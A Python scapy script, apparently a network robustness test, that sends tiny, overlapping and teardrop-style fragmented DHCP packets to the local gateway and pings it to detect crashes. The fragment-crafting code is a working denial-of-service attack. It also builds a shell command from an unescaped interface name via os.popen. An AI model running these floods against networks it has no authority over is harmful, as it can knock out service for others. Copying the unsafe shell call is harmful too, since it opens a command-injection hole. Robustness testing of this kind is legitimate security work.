from scapy.all import *
import random
import time
import logging
import sys
import os
import subprocess

def test_ip_fragmentation(interface_name):
    """
    Tests the DHCP server's resilience against fragmented IP packets.
    
    This test sends various types of fragmented DHCP packets to test the
    operating system's network stack robustness. Vulnerabilities in IP fragment
    reassembly can lead to denial of service or even code execution.
    
    The test includes:
    1. Normal fragmentation
    2. Tiny fragment attack
    3. Overlapping fragment attack
    4. Fragment gap attack (teardrop variant)
    """
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    results = {
        "status": "进行中",
        "tests_run": 0,
        "tests_passed": 0,
        "vulnerabilities": []
    }
    
    # Get router/server IP for ping test
    router_ip = get_router_ip(interface_name)
    if not router_ip:
        return {
            "status": "失败",
            "reason": "无法确定路由器IP地址，无法执行连通性测试"
        }
    
    # Initial ping to confirm router is online
    if not ping_host(router_ip):
        return {
            "status": "失败",
            "reason": f"路由器 {router_ip} 在测试开始前就无法ping通"
        }
    
    # Define test cases
    test_cases = [
        {
            "name": "normal_fragmentation",
            "description": "正常IP分片测试",
            "fragsize": 380,  # Normal fragment size
            "attack_type": "normal"
        },
        {
            "name": "tiny_fragment",
            "description": "微小分片攻击",
            "fragsize": 16,  # Very small fragment size
            "attack_type": "normal"
        },
        {
            "name": "overlapping_fragments",
            "description": "重叠分片攻击",
            "fragsize": 200,  # Medium fragment size
            "attack_type": "overlap"
        },
        {
            "name": "fragment_gap",
            "description": "分片间隙攻击 (泪滴攻击变种)",
            "fragsize": 100,  # Small-medium fragment size
            "attack_type": "gap"
        }
    ]
    
    # Run each test case
    for test_case in test_cases:
        result = run_fragmentation_test(interface_name, test_case, router_ip)
        results["tests_run"] += 1
        
        if result["status"] == "成功":
            results["tests_passed"] += 1
        else:
            results["vulnerabilities"].append({
                "test_name": test_case["name"],
                "description": test_case["description"],
                "details": result.get("reason", "未知错误")
            })
        
        # Wait between tests to allow router to recover
        time.sleep(3)
        
        # Check if router is still responsive
        if not ping_host(router_ip):
            results["status"] = "发现漏洞"
            results["server_crashed"] = "是"
            results["crash_details"] = f"路由器在 {test_case['name']} 测试后无响应，可能已崩溃"
            results["security_risk"] = "极高 - 发现可能的拒绝服务漏洞"
            
            # Give router time to recover before continuing
            recovery_wait = 30
            print(f"Router appears down. Waiting {recovery_wait} seconds for recovery...")
            time.sleep(recovery_wait)
            
            # Check if router recovered
            if ping_host(router_ip):
                results["router_recovered"] = "是"
                results["recovery_time"] = f"< {recovery_wait} 秒"
            else:
                results["router_recovered"] = "否"
                results["recovery_time"] = f"> {recovery_wait} 秒"
                # Stop testing if router doesn't recover
                break
    
    # Final assessment
    if results.get("server_crashed") == "是":
        results["status"] = "发现漏洞"
        results["network_stack_robustness"] = "低"
        results["security_assessment"] = "服务器的网络栈对IP分片攻击存在漏洞，可能导致拒绝服务"
    else:
        if results["tests_passed"] == results["tests_run"]:
            results["status"] = "成功"
            results["network_stack_robustness"] = "高"
            results["security_assessment"] = "服务器对IP分片攻击具有良好的防御能力"
        else:
            results["status"] = "发现异常"
            results["network_stack_robustness"] = "中" if results["tests_passed"] >= results["tests_run"] / 2 else "低"
            results["security_assessment"] = f"服务器在 {results['tests_run'] - results['tests_passed']}/{results['tests_run']} 个测试中表现出异常行为"
    
    # Final ping test
    if ping_host(router_ip):
        results["final_connectivity"] = "正常"
    else:
        results["final_connectivity"] = "异常 - 路由器可能仍处于受影响状态"
    
    return results

def run_fragmentation_test(interface_name, test_case, router_ip):
    """Run a specific IP fragmentation test"""
    socket = None
    
    try:
        mac_addr = get_if_hwaddr(interface_name)
        xid = random.randint(1, 0xFFFFFFFF)
        
        # Create a standard DHCP discover packet
        discover_pkt = (
            Ether(src=mac_addr, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac2str(mac_addr), xid=xid, flags=0x8000) /
            DHCP(options=[("message-type", "discover"), ("end")])
        )
        
        # Extract IP layer and up
        ip_packet = discover_pkt[IP]
        
        # Apply fragmentation based on test case
        if test_case["attack_type"] == "normal":
            # Normal fragmentation
            frags = fragment(ip_packet, fragsize=test_case["fragsize"])
        elif test_case["attack_type"] == "overlap":
            # Create overlapping fragments
            frags = create_overlapping_fragments(ip_packet, test_case["fragsize"])
        elif test_case["attack_type"] == "gap":
            # Create fragments with gaps (teardrop attack)
            frags = create_gap_fragments(ip_packet, test_case["fragsize"])
        else:
            return {"status": "失败", "reason": "未知攻击类型"}
        
        # Prepare to listen for responses
        socket = conf.L2listen(
            type=ETH_P_ALL,
            iface=interface_name,
            filter="udp and (port 67 or port 68)"
        )
        
        # Send fragments
        for frag in frags:
            sendp(Ether(src=mac_addr, dst="ff:ff:ff:ff:ff:ff")/frag, iface=interface_name, verbose=False)
            time.sleep(0.01)  # Small delay between fragments
        
        # Listen for DHCP offer
        dhcp_offer = None
        start_time = time.time()
        timeout = 5
        
        while time.time() - start_time < timeout:
            packets = socket.sniff(timeout=1, count=10)
            for pkt in packets:
                if DHCP in pkt and BOOTP in pkt and pkt[BOOTP].xid == xid:
                    if any(opt[1] == 2 for opt in pkt[DHCP].options if opt[0] == 'message-type'):
                        dhcp_offer = pkt
                        break
            if dhcp_offer:
                break
        
        # Check if router is still responsive
        router_responsive = ping_host(router_ip)
        
        # Analyze results
        if dhcp_offer:
            return {
                "status": "成功",
                "test_name": test_case["name"],
                "router_responsive": "是" if router_responsive else "否",
                "assigned_ip": dhcp_offer[BOOTP].yiaddr
            }
        else:
            # No DHCP response but router still pings
            if router_responsive:
                return {
                    "status": "部分成功",
                    "reason": "DHCP服务没有响应分片包，但路由器仍能ping通",
                    "test_name": test_case["name"],
                    "router_responsive": "是"
                }
            else:
                # Router is down - potential DoS vulnerability
                return {
                    "status": "失败",
                    "reason": "DHCP服务无响应且路由器不能ping通，可能存在拒绝服务漏洞",
                    "test_name": test_case["name"],
                    "router_responsive": "否",
                    "security_risk": "高"
                }
        
    except Exception as e:
        return {
            "status": "异常",
            "reason": str(e),
            "test_name": test_case["name"] if "name" in test_case else "未知测试"
        }
    finally:
        if socket:
            socket.close()

def create_overlapping_fragments(packet, fragsize):
    """
    Create overlapping IP fragments.
    This is a specific technique where fragments contain duplicate data.
    """
    # First create normal fragments
    frags = fragment(packet, fragsize=fragsize)
    
    if len(frags) < 2:
        return frags  # Not enough data to create overlapping fragments
    
    # Create a new list of fragments
    overlapping_frags = []
    
    # Add the first fragment normally
    overlapping_frags.append(frags[0])
    
    # For remaining fragments, modify to create overlap
    for i in range(1, len(frags)):
        # Decrease the fragment offset to create overlap with previous fragment
        if 'frag' in frags[i]:
            # Calculate overlap (25% of fragsize)
            overlap_bytes = min(int(fragsize * 0.25), 8) * 8  # Must be multiple of 8
            
            # Original offset
            original_offset = frags[i].frag
            
            # New offset with overlap
            new_offset = max(0, original_offset - overlap_bytes // 8)
            
            # Create overlapping fragment
            overlapping_frag = frags[i].copy()
            overlapping_frag.frag = new_offset
            overlapping_frags.append(overlapping_frag)
        else:
            overlapping_frags.append(frags[i])
    
    return overlapping_frags

def create_gap_fragments(packet, fragsize):
    """
    Create IP fragments with gaps between them (teardrop attack variant).
    """
    # First create normal fragments
    frags = fragment(packet, fragsize=fragsize)
    
    if len(frags) < 2:
        return frags  # Not enough data to create gap fragments
    
    # Create a new list of fragments
    gap_frags = []
    
    # Add the first fragment normally
    gap_frags.append(frags[0])
    
    # For remaining fragments, modify to create gaps
    for i in range(1, len(frags)):
        if 'frag' in frags[i]:
            # Calculate gap (25% of fragsize)
            gap_bytes = min(int(fragsize * 0.25), 16) * 8  # Must be multiple of 8
            
            # Original offset
            original_offset = frags[i].frag
            
            # New offset with gap
            new_offset = original_offset + gap_bytes // 8
            
            # Create fragment with gap
            gap_frag = frags[i].copy()
            gap_frag.frag = new_offset
            gap_frags.append(gap_frag)
        else:
            gap_frags.append(frags[i])
    
    return gap_frags

def get_router_ip(interface_name):
    """Get the IP address of the default gateway for the specified interface"""
    try:
        # First try to get interface IP
        if_addr = get_if_addr(interface_name)
        
        # Then try to find default gateway
        with os.popen(f"ip route | grep default | grep {interface_name}") as pipe:
            output = pipe.read().strip()
            if output:
                # Extract gateway IP from route output
                parts = output.split()
                gateway_index = parts.index("via") + 1 if "via" in parts else -1
                if gateway_index > 0 and gateway_index < len(parts):
                    return parts[gateway_index]
        
        # If gateway not found, use network address + 1 as a guess
        if if_addr:
            ip_parts = if_addr.split('.')
            if len(ip_parts) == 4:
                ip_parts[3] = '1'  # Assume gateway is .1
                return '.'.join(ip_parts)
        
        return None
    except Exception as e:
        print(f"Error getting router IP: {e}")
        return None

def ping_host(ip_addr, count=3, timeout=1):
    """Check if a host is responsive using ping"""
    try:
        # Use subprocess with timeout
        result = subprocess.run(
            ["ping", "-c", str(count), "-W", str(timeout), ip_addr],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout * count + 1
        )
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except Exception as e:
        print(f"Error pinging {ip_addr}: {e}")
        return False

# For standalone testing
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <interface_name>")
        sys.exit(1)
    
    interface = sys.argv[1]
    result = test_ip_fragmentation(interface)
    
    print(f"IP Fragmentation Test Results for {interface}:")
    print(f"Status: {result['status']}")
    print(f"Tests run: {result.get('tests_run', 'N/A')}")
    print(f"Tests passed: {result.get('tests_passed', 'N/A')}")
    
    if "vulnerabilities" in result and result["vulnerabilities"]:
        print("\nVulnerabilities found:")
        for vuln in result["vulnerabilities"]:
            print(f"- {vuln['test_name']}: {vuln['description']}")
            print(f"  Details: {vuln['details']}")
    
    if "security_assessment" in result:
        print(f"\nSecurity Assessment: {result['security_assessment']}")
    
    if "router_recovered" in result:
        print(f"Router crashed but recovered: {result['router_recovered']}")
        print(f"Recovery time: {result.get('recovery_time', 'Unknown')}")
    
    print(f"Final connectivity: {result.get('final_connectivity', 'Unknown')}")